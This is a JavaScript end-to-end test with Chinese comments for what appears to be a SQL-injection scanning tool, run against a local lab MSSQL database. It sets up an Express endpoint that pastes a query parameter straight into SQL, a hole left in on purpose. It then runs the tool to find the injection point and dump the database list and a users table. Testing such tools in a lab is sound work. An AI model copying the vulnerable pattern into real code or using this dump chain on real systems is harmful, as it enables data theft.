// ============================================================================
// e2e/mssql-lab/dump.e2e.mjs —— MSSQL 拖库正确性真机验证（extractMaps MSSQL 方言首测）
// ============================================================================
// 验证矩阵（对标 PG/MySQL 拖库 e2e 的口径）：
//   1. extractScalar(SYS.databases / information_schema.tables) —— 方言函数真机可用
//   2. enumerateDatabases → 表 → 列全链路（UTF-8/单引号/跳号数据正确性）
//   3. dumpTable 分页（OFFSET-FETCH）全量拖 users 表逐行核对
// 外部事实断言：拖出数据与 DB 直查基线一致。
// ============================================================================
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(HERE, '../..');
const _require = createRequire(resolve(ROOT, 'server/package.json'));
const sql = _require('mssql');
const express = _require('express');

const { ScanManager } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/ScanManager.js')).href);
const { Extractor } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/Extractor.js')).href);

const PORT = Number(process.env.MSSQL_LAB_PORT) || 8285;
const SQL_PORT = Number(process.env.MSSQL_TCP_PORT) || 65039;
const BASE = `http://127.0.0.1:${PORT}`;
const SQL = { server: '127.0.0.1', port: SQL_PORT, user: 'sa', password: 'SqLi_2026_T!', database: 'sqli_lab_mssql', options: { trustServerCertificate: true, encrypt: false } };

// ---- 基线数据（含中文 / 单引号 / 跳号 ID）----
const pool = await sql.connect(SQL);
try { await pool.request().query(`IF OBJECT_ID('users') IS NULL CREATE TABLE users (id INT PRIMARY KEY, username NVARCHAR(64), email NVARCHAR(128), password NVARCHAR(128), role NVARCHAR(32))`); } catch { /* noop */ }
const cnt = await pool.request().query('SELECT COUNT(*) n FROM users');
if (cnt.recordset[0].n === 0) {
  await pool.request().query(`INSERT INTO users VALUES (1,'admin','admin@lab.local','admin123','admin'),(2,'alice','alice@lab.local','alice123','user'),(3,'bob','bob@lab.local','bob123','user'),(5,N'张三','zhang@lab.local','zh123','user'),(9,'o''brien','ob@lab.local','ob123','user')`);
}
const baseline = await pool.request().query('SELECT id, username, email FROM users ORDER BY id');
console.log(`[pre] 基线 users ${baseline.recordset.length} 行（含中文/单引号/跳号）`);

// ---- 靶场 ----
const app = express();
app.get('/num', async (req, res) => {
  const id = String(req.query.id ?? '1');
  try {
    const r = await pool.request().query(`SELECT id, username, email FROM users WHERE id = ${id}`);
    const rowsHtml = (r.recordset || []).map((x) => `<tr><td>${x.id}</td><td>${x.username}</td><td>${x.email}</td></tr>`).join('');
    res.send(`<!DOCTYPE html><html><body><h1>User</h1><table border="1">${rowsHtml}</table></body></html>`);
  } catch (e) { res.status(500).send('Query error: ' + e.message); }
});
const server = app.listen(PORT, '127.0.0.1');
await new Promise((resolve, reject) => {
  server.once('listening', resolve);
  server.once('error', (e) => reject(new Error('[mssql-dump] 靶场端口监听失败（被占用？先杀残留进程）: ' + e.message)));
});
console.log(`[step1] 靶场就绪 ${BASE}/num?id=1`);

// ---- 扫描拿注入点 ----
const sm = new ScanManager();
const scanId = await sm.start({ url: `${BASE}/num?id=1`, config: { concurrency: 2, ratePerSec: 0, retry: 0, timeoutMs: 15000, techniques: ['union'], dbms: 'SQL Server' } });
const t0 = Date.now();
for (;;) { const s = sm.scans.get(scanId); if (s && (s.status === 'completed' || s.status === 'error')) break; if (Date.now() - t0 > 120000) break; await new Promise((r) => setTimeout(r, 40)); }
const report = sm.getReport(scanId) || {};
const vuln = (report.vulns || [])[0];
const point = (report.points || []).find((p) => p.id === vuln?.pointId) || (report.points || [])[0];
if (!vuln || !point) { console.log('[FAIL] 未取得注入点'); server.close(); await pool.close(); process.exit(1); }
const target = report.target || { url: BASE };
const ctx = { httpClient: sm.getScanClient(scanId, target), config: target.config || {}, target, point, dbms: 'SQL Server' };
console.log(`[step2] 注入点 ${point.id}（boundary=${JSON.stringify(point.boundary)} columns=${point.columns}）`);

// ---- Extractor 拖库全链路（MSSQL 方言真机首测）----
const ex = new Extractor();
const fails = [];

// 1) databases 枚举（string_agg 方言）
const dbs = await ex.extractScalar(ctx, "SELECT string_agg(name, ',') FROM sys.databases");
if (!dbs || !String(dbs).includes('sqli_lab_mssql')) fails.push(`databases 枚举失败: ${JSON.stringify(dbs)}`);
console.log(`[step3] databases: ${JSON.stringify(String(dbs).slice(0, 80))}`);

// 2) users 表全量拖取（OFFSET-FETCH 分页 + 0x1F/0x1E 分隔符解析）
let dumped = [];
let offset = 0;
const pageSize = 2;
for (;;) {
  const q = `SELECT string_agg(CONCAT_WS(CHAR(31), CAST(id AS VARCHAR(16)), username, email), CHAR(30)) FROM (SELECT id, username, email FROM [users] ORDER BY (SELECT NULL) OFFSET ${offset} ROWS FETCH NEXT ${pageSize} ROWS ONLY) __p`;
  const page = await ex.extractScalar(ctx, q);
  if (!page || !String(page).trim()) break;
  for (const line of String(page).split('\x1E').filter(Boolean)) {
    const [id, username, email] = line.split('\x1F');
    if (id != null) dumped.push({ id: Number(id), username, email });
  }
  offset += pageSize;
  if (offset > 20) break; // 防御性上限
}
console.log(`[step4] 拖取 ${dumped.length} 行`);

// 3) 逐行核对（跳号 4/6/7/8 应不存在，中文/单引号应原样）
for (const b of baseline.recordset) {
  const d = dumped.find((x) => x.id === b.id);
  if (!d) { fails.push(`缺行 id=${b.id}`); continue; }
  if (d.username !== b.username) fails.push(`id=${b.id} username 不符: got=${JSON.stringify(d.username)} want=${JSON.stringify(b.username)}`);
  if (d.email !== b.email) fails.push(`id=${b.id} email 不符`);
}
for (const d of dumped) {
  if (![1, 2, 3, 5, 9].includes(d.id)) fails.push(`多出/错行 id=${d.id}`);
}
const zhang = dumped.find((x) => x.username === '张三');
const obrien = dumped.find((x) => x.username === "o'brien");
if (!zhang) fails.push('中文行（张三）丢失或乱码');
if (!obrien) fails.push("单引号行（o'brien）丢失或转义错");

// ---- 判定 ----
const ok = fails.length === 0 && dumped.length === baseline.recordset.length;
console.log(fails.length ? `[fails]\n- ${fails.join('\n- ')}` : '[fails] 无');
console.log(`\n[${ok ? 'PASS' : 'FAIL'}] MSSQL 拖库正确性：${dumped.length}/${baseline.recordset.length} 行，中文/单引号/跳号全对`);

server.close();
await pool.close();
process.exit(ok ? 0 : 1);
